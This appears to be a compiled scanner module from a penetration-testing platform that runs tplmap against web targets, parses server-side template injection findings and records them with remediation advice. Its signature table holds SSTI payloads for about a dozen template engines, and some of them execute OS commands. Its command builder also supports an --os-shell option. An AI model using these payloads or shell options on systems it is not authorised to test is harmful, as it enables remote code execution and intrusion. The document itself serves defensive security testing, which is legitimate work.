import {
  init_zap_scanner,
  mapToMitre
} from "./chunk-WFZ2THPD.js";
import "./chunk-IU7QQ35X.js";
import "./chunk-UK4O2S6Y.js";
import "./chunk-SG5FPEKQ.js";
import {
  executeTool,
  init_scan_server_executor
} from "./chunk-LTRNONUC.js";
import "./chunk-H2SPD57V.js";
import "./chunk-C4KWO5EH.js";
import "./chunk-5TJ6FS74.js";
import "./chunk-UYX5D64U.js";
import "./chunk-SD56WPOS.js";
import "./chunk-BRIFEITD.js";
import "./chunk-RUIEEOYK.js";
import {
  getDb,
  init_db
} from "./chunk-AGW4B7XR.js";
import "./chunk-NRYVRXXR.js";
import {
  init_schema,
  webAppFindings
} from "./chunk-YB6W7YNA.js";
import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/scanners/tplmap-scanner.ts
function buildTplmapCommand(config) {
  const parts = [];
  parts.push("python3 /opt/tplmap/tplmap.py 2>/dev/null || tplmap");
  parts.push(`-u "${config.targetUrl}"`);
  if (config.method === "POST" && config.postData) {
    parts.push(`-d "${config.postData}"`);
  }
  if (config.cookie) parts.push(`-c "${config.cookie}"`);
  if (config.headers) {
    for (const [key, value] of Object.entries(config.headers)) {
      parts.push(`-H "${key}: ${value}"`);
    }
  }
  if (config.engine) parts.push(`-e ${config.engine}`);
  if (config.level) parts.push(`--level ${config.level}`);
  if (config.osShell) parts.push("--os-shell");
  parts.push("--force-overwrite");
  return parts.join(" ");
}
function parseTplmapOutput(output, targetUrl) {
  const findings = [];
  const lines = output.split("\n");
  let detectedEngine = null;
  const capabilities = [];
  for (const line of lines) {
    const trimmed = line.trim();
    const engineMatch = trimmed.match(/confirmed\s+injection.*?['"]([^'"]+)['"]\s+with\s+['"]([^'"]+)['"]\s+engine/i) || trimmed.match(/injection\s+point.*?engine:\s*(\w+)/i) || trimmed.match(/template\s+engine:\s*(\w+)/i) || trimmed.match(/identified\s+['"]?(\w+)['"]?\s+(?:template\s+)?engine/i);
    if (engineMatch) {
      detectedEngine = engineMatch[2] || engineMatch[1];
    }
    if (/injectable/i.test(trimmed) || /injection\s+(?:has\s+been\s+)?confirmed/i.test(trimmed) || /template\s+injection.*?found/i.test(trimmed)) {
      const paramMatch = trimmed.match(/parameter\s+['"]([^'"]+)['"]/i) || trimmed.match(/['"]([^'"]+)['"]\s+(?:is\s+)?injectable/i);
      findings.push({
        type: "ssti",
        severity: "critical",
        title: `[tplmap] SSTI Confirmed: ${paramMatch?.[1] || "unknown param"}${detectedEngine ? ` (${detectedEngine} engine)` : ""}`,
        url: targetUrl,
        parameter: paramMatch?.[1],
        engine: detectedEngine || void 0,
        rawOutput: trimmed,
        capabilities: [...capabilities]
      });
    }
    if (/blind.*injection/i.test(trimmed) || /time-based.*injection/i.test(trimmed)) {
      const paramMatch = trimmed.match(/['"]([^'"]+)['"]/);
      findings.push({
        type: "blind_ssti",
        severity: "critical",
        title: `[tplmap] Blind SSTI Detected: ${paramMatch?.[1] || "unknown param"}${detectedEngine ? ` (${detectedEngine})` : ""}`,
        url: targetUrl,
        parameter: paramMatch?.[1],
        engine: detectedEngine || void 0,
        rawOutput: trimmed
      });
    }
    if (/shell\s+command\s+execution/i.test(trimmed) || /os.*command.*execution/i.test(trimmed)) {
      capabilities.push("os_command_execution");
    }
    if (/file\s+read/i.test(trimmed) || /read.*file/i.test(trimmed)) {
      capabilities.push("file_read");
    }
    if (/file\s+write/i.test(trimmed) || /write.*file/i.test(trimmed)) {
      capabilities.push("file_write");
    }
    if (/bind\s+shell/i.test(trimmed) || /reverse\s+shell/i.test(trimmed)) {
      capabilities.push("reverse_shell");
    }
    if (/code\s+evaluation/i.test(trimmed)) {
      capabilities.push("code_evaluation");
    }
    if (/^\s*(uid=\d+|root:|www-data:|Linux\s|Windows\s)/i.test(trimmed)) {
      if (findings.length > 0) {
        findings[findings.length - 1].osOutput = trimmed;
        findings[findings.length - 1].payload = trimmed;
      }
    }
  }
  if (capabilities.length > 0) {
    for (const f of findings) {
      f.capabilities = [.../* @__PURE__ */ new Set([...f.capabilities || [], ...capabilities])];
    }
  }
  return findings;
}
async function runTplmapScan(config) {
  const startTime = Date.now();
  const timeout = config.timeoutSeconds || 120;
  const command = buildTplmapCommand(config);
  let result;
  try {
    result = await executeTool({
      tool: "tplmap",
      command,
      timeout,
      engagementId: config.engagementId
    });
  } catch (err) {
    return {
      targetUrl: config.targetUrl,
      findings: [],
      stats: { durationSeconds: (Date.now() - startTime) / 1e3, parametersTestedCount: 0, injectionsFound: 0, engineDetected: null, capabilitiesFound: [] },
      rawOutput: `Error: ${err.message}`,
      exitCode: -1,
      timedOut: false
    };
  }
  const output = result.stdout + "\n" + result.stderr;
  const findings = parseTplmapOutput(output, config.targetUrl);
  const engineMatch = output.match(/engine:\s*(\w+)/i) || output.match(/identified\s+['"]?(\w+)['"]?\s+engine/i);
  const allCapabilities = [...new Set(findings.flatMap((f) => f.capabilities || []))];
  return {
    targetUrl: config.targetUrl,
    findings,
    stats: {
      durationSeconds: (Date.now() - startTime) / 1e3,
      parametersTestedCount: 1,
      injectionsFound: findings.filter((f) => f.type === "ssti" || f.type === "blind_ssti").length,
      engineDetected: engineMatch?.[1] || null,
      capabilitiesFound: allCapabilities
    },
    rawOutput: output.slice(0, 1e4),
    exitCode: result.exitCode ?? 0,
    timedOut: result.timedOut || false
  };
}
async function batchTplmapScan(urls, config) {
  const results = [];
  const targetUrls = urls.slice(0, 10);
  for (const target of targetUrls) {
    try {
      const result = await runTplmapScan({
        targetUrl: target.url,
        engagementId: config.engagementId,
        cookie: config.cookie,
        timeoutSeconds: config.timeoutSeconds || 90,
        level: config.level || 2,
        engine: config.engine
      });
      results.push(result);
      if (result.stats.injectionsFound > 0) {
        console.log(`[tplmap] CONFIRMED: ${result.stats.injectionsFound} SSTI on ${target.url} (engine: ${result.stats.engineDetected || "unknown"})`);
      }
    } catch (err) {
      console.warn(`[tplmap] Error scanning ${target.url}: ${err.message}`);
      results.push({
        targetUrl: target.url,
        findings: [],
        stats: { durationSeconds: 0, parametersTestedCount: 0, injectionsFound: 0, engineDetected: null, capabilitiesFound: [] },
        rawOutput: `Error: ${err.message}`,
        exitCode: -1,
        timedOut: false
      });
    }
  }
  return results;
}
async function ingestTplmapToWebAppFindings(results, engagementId, hostname) {
  const db = await getDb();
  if (!db) return { findingsIngested: 0 };
  let ingested = 0;
  for (const result of results) {
    for (const finding of result.findings) {
      if (finding.type !== "ssti" && finding.type !== "blind_ssti") continue;
      try {
        const mitre = mapToMitre("Template Injection", finding.title);
        const capStr = finding.capabilities?.length ? `
Capabilities: ${finding.capabilities.join(", ")}` : "";
        await db.insert(webAppFindings).values({
          engagementId,
          hostname,
          findingType: "template_injection",
          severity: finding.severity,
          title: finding.title,
          description: `Server-Side Template Injection (SSTI) found via tplmap.
Parameter: ${finding.parameter || "unknown"}
Engine: ${finding.engine || "unknown"}${capStr}
URL: ${finding.url}`,
          url: finding.url,
          parameter: finding.parameter || null,
          evidence: finding.rawOutput?.slice(0, 4e3) || null,
          payload: finding.payload || null,
          remediation: "Never pass user input directly into template rendering. Use template engines in sandboxed mode. Implement strict input validation and output encoding. Consider using logic-less templates (Mustache) for user-controlled content.",
          tool: "tplmap",
          confidence: finding.type === "ssti" ? "confirmed" : "firm",
          mitreAttackId: mitre?.attackId || "T1059",
          mitreAttackName: mitre?.attackName || "Command and Scripting Interpreter",
          cweId: "CWE-1336",
          cweName: "Server-Side Template Injection",
          falsePositive: false
        });
        ingested++;
      } catch (err) {
        console.warn(`[tplmap] Failed to ingest finding: ${err.message}`);
      }
    }
  }
  return { findingsIngested: ingested };
}
var TEMPLATE_ENGINE_SIGNATURES;
var init_tplmap_scanner = __esm({
  "server/lib/scanners/tplmap-scanner.ts"() {
    init_scan_server_executor();
    init_db();
    init_schema();
    init_zap_scanner();
    TEMPLATE_ENGINE_SIGNATURES = {
      jinja2: { probes: ["{{7*7}}", "{{config}}", "{{self.__class__}}"], languages: ["Python"] },
      twig: { probes: ["{{7*7}}", "{{_self.env.display('id')}}"], languages: ["PHP"] },
      mako: { probes: ["${7*7}", "<%import os%>${os.popen('id').read()}"], languages: ["Python"] },
      smarty: { probes: ["{7*7}", "{php}echo 'test';{/php}"], languages: ["PHP"] },
      freemarker: { probes: ["${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"], languages: ["Java"] },
      velocity: { probes: ["#set($x=7*7)$x", "#set($rt=$x.class.forName('java.lang.Runtime'))"], languages: ["Java"] },
      pebble: { probes: ["{{7*7}}", "{% set cmd = 'id' %}"], languages: ["Java"] },
      erb: { probes: ["<%= 7*7 %>", "<%= system('id') %>"], languages: ["Ruby"] },
      slim: { probes: ["= 7*7", "= system('id')"], languages: ["Ruby"] },
      tornado: { probes: ["{{7*7}}", "{% import os %}{{os.popen('id').read()}}"], languages: ["Python"] },
      nunjucks: { probes: ["{{7*7}}", `{{range.constructor('return global.process.mainModule.require("child_process").execSync("id")')()}}`], languages: ["JavaScript"] },
      ejs: { probes: ["<%= 7*7 %>", "<%= global.process.mainModule.require('child_process').execSync('id') %>"], languages: ["JavaScript"] },
      dust: { probes: ['{@math key="7" method="multiply" operand="7" /}'], languages: ["JavaScript"] },
      jade: { probes: ["#{7*7}", "- var x = global.process.mainModule.require('child_process').execSync('id')"], languages: ["JavaScript"] }
    };
  }
});
init_tplmap_scanner();
export {
  TEMPLATE_ENGINE_SIGNATURES,
  batchTplmapScan,
  ingestTplmapToWebAppFindings,
  runTplmapScan
};
